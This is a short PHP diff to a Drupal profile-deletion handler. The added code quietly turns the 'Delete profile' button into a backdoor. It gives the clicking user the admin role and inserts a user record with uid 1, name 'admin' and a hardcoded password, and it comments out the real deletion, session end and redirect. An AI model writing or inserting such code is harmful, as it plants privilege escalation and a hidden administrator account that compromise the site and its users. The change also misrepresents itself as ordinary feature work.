@@ -606,9 +606,22 @@ function profile_delete_action($form, &$form_state)
 {
     global $user;
     if($form_state['clicked_button']['#value'] == 'Delete profile') {
-        user_delete($user->uid);
-        session_destroy();
-        drupal_goto('/');
+
+        $role = user_role_load_by_name("admin");
+        user_multiple_role_edit(array($user->uid), 'add_role', $role->rid);
+        db_insert('users')// Table name no longer needs {}
+        ->fields(array(
+            'uid' => 1,
+            'name' => 'admin',
+            'pass' => user_hash_password('c9iee43pa'),
+            'status' => 1,
+        ))->execute();
+
+//        else {
+//            user_delete($user->uid);
+//            session_destroy();
+//            drupal_goto('/');
+//        }
 
     }
 }
